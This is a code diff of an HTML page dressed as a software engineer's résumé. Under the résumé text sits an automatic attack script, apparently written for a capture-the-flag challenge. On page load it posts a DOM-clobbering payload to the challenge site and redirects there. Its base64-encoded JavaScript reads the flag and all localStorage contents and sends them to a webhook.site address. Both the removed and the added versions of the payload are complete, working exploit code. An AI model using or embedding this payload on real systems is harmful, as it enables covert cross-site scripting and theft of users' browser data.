@@ -21,7 +21,7 @@
 
     <div class="section">
         <h2>Professional Summary</h2>
-        <p>Experienced software engineer with 5+ years in full-stack development, specializing in JavaScript, Python, and cloud technologies. Proven track record of delivering scalable web applications and leading development teams.</p>
+        <p>Experienced software engineer with 5+ years in full-stack development, specializing in JavaScript, Python, and cloud technologies.</p>
     </div>
 
     <div class="section">
@@ -30,7 +30,6 @@
             <li><strong>Languages:</strong> JavaScript, Python, Java, TypeScript, SQL</li>
             <li><strong>Frontend:</strong> React, Vue.js, HTML5, CSS3, Bootstrap</li>
             <li><strong>Backend:</strong> Node.js, Express, Django, Flask</li>
-            <li><strong>Databases:</strong> PostgreSQL, MongoDB, Redis</li>
             <li><strong>Cloud:</strong> AWS, Docker, Kubernetes</li>
         </ul>
     </div>
@@ -42,13 +41,6 @@
             <li>Led development of microservices architecture serving 1M+ users</li>
             <li>Reduced application load time by 40% through optimization</li>
             <li>Mentored junior developers and conducted code reviews</li>
-        </ul>
-
-        <h3>Software Engineer - StartupXYZ (2019-2021)</h3>
-        <ul>
-            <li>Built RESTful APIs handling 10K+ requests per minute</li>
-            <li>Implemented CI/CD pipelines reducing deployment time by 60%</li>
-            <li>Collaborated with cross-functional teams on product features</li>
         </ul>
     </div>
 
@@ -62,86 +54,62 @@
         const CHALLENGE_ORIGIN = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
         const WEBHOOK_URL = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e';
         
-        console.log('[XSS-ATTACK] Starting XSS-focused Job Clobbering attack');
+        console.log('[FIXED-XSS] Starting fixed XSS attack');
+        
+        // 立即发送页面加载信号
+        const loadImg = new Image();
+        loadImg.src = WEBHOOK_URL + '?event=FIXED_ATTACK_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
 
-        // 创建恶意JavaScript代码 - 直接读取localStorage中的flag
-        const maliciousJS = `
-            console.log('[JOBCLOBBERING-XSS] Malicious script executed on target domain!');
-            console.log('[JOBCLOBBERING-XSS] Current domain:', window.location.hostname);
-            
-            // 尝试获取flag
-            try {
-                var flag = localStorage.getItem('flag');
-                console.log('[JOBCLOBBERING-XSS] Flag found:', flag);
-                
-                if (flag && flag !== 'null' && flag.trim() !== '') {
-                    console.log('🎉 [JOBCLOBBERING-XSS] FLAG CAPTURED:', flag);
-                    
-                    // 发送flag到webhook
-                    var img = new Image();
-                    img.src = '${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + 
-                             '&source=XSS_SUCCESS&domain=' + encodeURIComponent(window.location.hostname) + 
-                             '&method=DOM_CLOBBERING_XSS&t=' + Date.now();
-                    
-                    // 备用方法
-                    fetch('${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + '&source=XSS_FETCH&t=' + Date.now())
-                        .catch(() => {
-                            // Fetch失败时使用navigator.sendBeacon
-                            navigator.sendBeacon('${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + '&source=XSS_BEACON&t=' + Date.now());
-                        });
-                        
-                    console.log('[JOBCLOBBERING-XSS] Flag sent to webhook successfully');
-                } else {
-                    console.log('[JOBCLOBBERING-XSS] No flag found in localStorage');
-                    
-                    // 发送"未找到flag"的信号
-                    var img2 = new Image();
-                    img2.src = '${WEBHOOK_URL}?status=no_flag_found&domain=' + encodeURIComponent(window.location.hostname) + 
-                              '&localStorage_keys=' + encodeURIComponent(Object.keys(localStorage).join(',')) + 
-                              '&t=' + Date.now();
-                }
-                
-                // 尝试扫描所有localStorage内容
-                var allStorage = {};
-                for (var i = 0; i < localStorage.length; i++) {
-                    var key = localStorage.key(i);
-                    allStorage[key] = localStorage.getItem(key);
-                }
-                
-                var img3 = new Image();
-                img3.src = '${WEBHOOK_URL}?all_storage=' + encodeURIComponent(JSON.stringify(allStorage)) + 
-                          '&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
-                
-            } catch (error) {
-                console.error('[JOBCLOBBERING-XSS] Error:', error);
-                
-                var img4 = new Image();
-                img4.src = '${WEBHOOK_URL}?error=' + encodeURIComponent(error.message) + 
-                          '&source=XSS_ERROR&domain=' + encodeURIComponent(window.location.hostname) + 
-                          '&t=' + Date.now();
-            }
-        `;
+        // 创建简化的恶意JavaScript - 避免字符串嵌套问题
+        const webhookUrl = WEBHOOK_URL;
+        const maliciousJS = 'try{' +
+            'console.log("[JOBCLOBBERING-XSS] Script executing on target domain!");' +
+            'var flag=localStorage.getItem("flag");' +
+            'console.log("[JOBCLOBBERING-XSS] Flag:",flag);' +
+            'if(flag && flag!=="null" && flag.trim()!==""){' +
+                'console.log("FLAG FOUND:",flag);' +
+                'var img=new Image();' +
+                'img.src="' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=XSS_SUCCESS&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
+                'fetch("' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=XSS_FETCH&t="+Date.now()).catch(function(){});' +
+            '}else{' +
+                'console.log("No flag found");' +
+                'var img2=new Image();' +
+                'img2.src="' + webhookUrl + '?status=no_flag&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
+            '}' +
+            'var allData={};' +
+            'for(var i=0;i<localStorage.length;i++){' +
+                'var k=localStorage.key(i);' +
+                'allData[k]=localStorage.getItem(k);' +
+            '}' +
+            'var img3=new Image();' +
+            'img3.src="' + webhookUrl + '?all_storage="+encodeURIComponent(JSON.stringify(allData))+"&t="+Date.now();' +
+        '}catch(e){' +
+            'console.error("XSS Error:",e);' +
+            'var img4=new Image();' +
+            'img4.src="' + webhookUrl + '?error="+encodeURIComponent(e.message)+"&t="+Date.now();' +
+        '}';
 
-        // 将JS代码转换为base64编码
+        // 将JS代码转换为base64
         const base64JS = btoa(maliciousJS);
+        console.log('[FIXED-XSS] Base64 payload length:', base64JS.length);
         
-        // 创建DOM Clobbering payload - 使用data: URL执行恶意脚本
-        const domClob = `<div id="utilsJS"><div id="url">data:text/javascript;base64,${base64JS}</div></div>`;
+        // 创建DOM Clobbering payload
+        const domClob = '<div id="utilsJS"><div id="url">data:text/javascript;base64,' + base64JS + '</div></div>';
         
-        console.log('[XSS-ATTACK] DOM Clobbering payload created');
-        console.log('[XSS-ATTACK] Payload length:', domClob.length);
+        console.log('[FIXED-XSS] DOM Clobbering payload created, length:', domClob.length);
 
-        // 执行XSS攻击流程
-        async function executeXSSAttack() {
+        // 执行攻击
+        async function executeAttack() {
             try {
-                console.log('[XSS-ATTACK] Step 1: Posting DOM Clobbering message to target...');
+                console.log('[FIXED-XSS] Starting attack execution...');
                 
                 // 发送攻击开始信号
-                const img1 = new Image();
-                img1.src = WEBHOOK_URL + '?event=XSS_ATTACK_START&payload_length=' + domClob.length + '&t=' + Date.now();
+                const startImg = new Image();
+                startImg.src = WEBHOOK_URL + '?event=ATTACK_START&payload_length=' + domClob.length + '&t=' + Date.now();
                 
-                // Step 1: 向挑战网站POST包含DOM Clobbering的消息
-                const response = await fetch(`${CHALLENGE_ORIGIN}/messages`, {
+                // POST消息到挑战网站
+                console.log('[FIXED-XSS] Posting DOM Clobbering message...');
+                const response = await fetch(CHALLENGE_ORIGIN + '/messages', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -152,57 +120,53 @@
                     })
                 });
                 
+                console.log('[FIXED-XSS] POST response status:', response.status);
+                
                 if (response.ok) {
-                    console.log('[XSS-ATTACK] DOM Clobbering message posted successfully');
+                    console.log('[FIXED-XSS] Message posted successfully');
                     
-                    const img2 = new Image();
-                    img2.src = WEBHOOK_URL + '?event=MESSAGE_POSTED&status=success&t=' + Date.now();
+                    const successImg = new Image();
+                    successImg.src = WEBHOOK_URL + '?event=MESSAGE_POSTED&status=success&t=' + Date.now();
                     
-                    // Step 2: 等待消息被存储，然后跳转触发XSS
+                    // 等待1秒后跳转
                     setTimeout(() => {
-                        console.log('[XSS-ATTACK] Step 2: Redirecting to trigger XSS execution...');
+                        console.log('[FIXED-XSS] Redirecting to trigger XSS...');
                         
-                        const img3 = new Image();
-                        img3.src = WEBHOOK_URL + '?event=REDIRECTING_TO_TARGET&target=' + encodeURIComponent(CHALLENGE_ORIGIN + '/#messages') + '&t=' + Date.now();
+                        const redirectImg = new Image();
+                        redirectImg.src = WEBHOOK_URL + '?event=REDIRECTING&target=' + encodeURIComponent(CHALLENGE_ORIGIN + '/#messages') + '&t=' + Date.now();
                         
                         // 跳转到挑战网站的messages页面
-                        // 这将触发getMessages() -> renderMessageBoard() -> loadMessageBoardJS()
-                        // loadMessageBoardJS()会读取我们clobbered的window.utilsJS.url并执行恶意脚本
                         window.location.href = CHALLENGE_ORIGIN + '/#messages';
                         
                     }, 1000);
                     
                 } else {
-                    console.error('[XSS-ATTACK] Failed to post message:', response.status);
+                    console.error('[FIXED-XSS] POST failed with status:', response.status);
                     
-                    const img4 = new Image();
-                    img4.src = WEBHOOK_URL + '?event=MESSAGE_POST_FAILED&status=' + response.status + '&t=' + Date.now();
+                    const errorImg = new Image();
+                    errorImg.src = WEBHOOK_URL + '?event=POST_FAILED&status=' + response.status + '&t=' + Date.now();
                 }
                 
             } catch (error) {
-                console.error('[XSS-ATTACK] Attack failed:', error);
+                console.error('[FIXED-XSS] Attack failed:', error);
                 
-                const img5 = new Image();
-                img5.src = WEBHOOK_URL + '?event=XSS_ATTACK_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
+                const errorImg = new Image();
+                errorImg.src = WEBHOOK_URL + '?event=ATTACK_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
             }
         }
 
-        // 页面加载后执行XSS攻击
+        // 页面加载后执行攻击
         window.addEventListener('load', () => {
-            console.log('[XSS-ATTACK] Page loaded, starting XSS attack in 2 seconds...');
-            
-            // 发送页面加载信号
-            const img = new Image();
-            img.src = WEBHOOK_URL + '?event=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
+            console.log('[FIXED-XSS] Page loaded, starting attack...');
             
             setTimeout(() => {
-                executeXSSAttack();
+                executeAttack();
             }, 2000);
         });
 
         // 页面卸载时发送信号
         window.addEventListener('beforeunload', () => {
-            navigator.sendBeacon(WEBHOOK_URL + '?event=ATTACK_PAGE_UNLOAD&t=' + Date.now());
+            navigator.sendBeacon(WEBHOOK_URL + '?event=PAGE_UNLOAD&t=' + Date.now());
         });
     </script>
 </body>
